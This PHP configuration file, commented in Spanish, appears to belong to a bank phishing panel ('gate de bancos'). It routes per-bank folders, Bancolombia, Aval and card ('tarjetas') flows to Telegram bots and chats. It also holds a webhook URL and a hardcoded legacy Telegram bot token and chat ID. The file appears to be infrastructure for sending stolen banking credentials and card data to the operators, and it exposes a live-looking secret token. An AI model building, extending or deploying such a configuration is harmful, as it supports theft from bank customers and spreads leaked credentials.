<?php
/**
 * Configuración central de credenciales para la gate de bancos (portado del SURA).
 * Las credenciales se leen desde admin/config.json (FU7UR4MA-CONTROL) para tener
 * una sola fuente de verdad: el mismo bot y chat genéricos del panel.
 */
require_once __DIR__ . '/../includes/app-config.php';

$botToken = app_cfg('telegram.bot_token', '');
$chatId   = app_cfg('telegram.chat_id_genericos', '');

return [
    "api_key"    => app_cfg('api_key', ''),
    "public_key" => app_cfg('api_key', ''),
    "bot_token"  => $botToken,
    "chat_id"    => $chatId,
    "chat_id_notificaciones" => $chatId,
    "chat_id_aval"         => $chatId,
    "chat_id_tarjetas"     => $chatId,
    "chat_id_bancolombia"  => $chatId,
    "chat_id_flujo"        => $chatId,
    "webhook_url" => "https://playcentral.onrender.com/telegram-webhook.php?bot=madre",
    // Bot del proyecto anterior (mensajes viejos con botones siguen funcionando)
    "legacy_bot_token" => "8727151145:AAEV5bH4drtp0nzUDUg0lJhfUZEc1QfF8Ws",
    "legacy_chat_id"   => "-5527039452",
    // Todas las carpetas de banco usan el mismo bot/chat de genéricos
    "b-01" => ["bot_token" => $botToken, "chat_id" => $chatId],
    "b-02" => ["bot_token" => $botToken, "chat_id" => $chatId],
    "b-03" => ["bot_token" => $botToken, "chat_id" => $chatId],
    "b-04" => ["bot_token" => $botToken, "chat_id" => $chatId],
    "b-05" => ["bot_token" => $botToken, "chat_id" => $chatId],
    "b-06" => ["bot_token" => $botToken, "chat_id" => $chatId],
    "b-07" => ["bot_token" => $botToken, "chat_id" => $chatId],
    "b-08" => ["bot_token" => $botToken, "chat_id" => $chatId],
    "b-09" => ["bot_token" => $botToken, "chat_id" => $chatId],
    "b-10" => ["bot_token" => $botToken, "chat_id" => $chatId],
    "b-11" => ["bot_token" => $botToken, "chat_id" => $chatId],
    "b-12" => ["bot_token" => $botToken, "chat_id" => $chatId],
    "b-13" => ["bot_token" => $botToken, "chat_id" => $chatId],
    "b-14" => ["bot_token" => $botToken, "chat_id" => $chatId],
    "b-15" => ["bot_token" => $botToken, "chat_id" => $chatId],
    "datac" => ["bot_token" => $botToken, "chat_id" => $chatId],
    "default" => ["bot_token" => $botToken, "chat_id" => $chatId],
];
